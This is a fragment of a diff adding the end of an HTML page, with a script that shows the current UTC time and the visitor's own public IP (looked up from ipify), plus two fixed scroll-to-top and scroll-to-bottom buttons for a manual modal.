+            const timeStr = `${now.getUTCFullYear()}-${pad(now.getUTCMonth()+1)}-${pad(now.getUTCDate())}T${pad(now.getUTCHours())}:${pad(now.getUTCMinutes())}:${pad(now.getUTCSeconds())}Z`;
+            document.getElementById('page-time').textContent = timeStr;
+
+            // Fetch IP
+            try {
+                const resp = await fetch('https://api.ipify.org?format=json');
+                const data = await resp.json();
+                document.getElementById('user-ip').textContent = data.ip;
+            } catch(e) {
+                document.getElementById('user-ip').textContent = 'unavailable';
+            }
+        });
+    </script>
+    <div id="scroll-arrows" style="display:none; position:fixed; bottom:18px; right:18px; flex-direction:column; gap:4px; z-index:99999;">
+        <button onclick="document.getElementById('manual-modal-card').scrollTo({top:0,behavior:'smooth'})" style="width:32px;height:32px;border-radius:4px;background:rgba(80,80,80,0.75);border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;" title="Scroll to top">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M7.41 15.41L12 10.83l4.59 4.58L18 14l-6-6-6 6z"/></svg>
+        </button>
+        <button onclick="document.getElementById('manual-modal-card').scrollTo({top:document.getElementById('manual-modal-card').scrollHeight,behavior:'smooth'})" style="width:32px;height:32px;border-radius:4px;background:rgba(80,80,80,0.75);border:none;cursor:pointer;display:flex;align-items:center;justify-content:center;" title="Scroll to bottom">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M16.59 8.59L12 13.17 7.41 8.59 6 10l6 6 6-6z"/></svg>
+        </button>
+    </div>
+</body>
+</html>
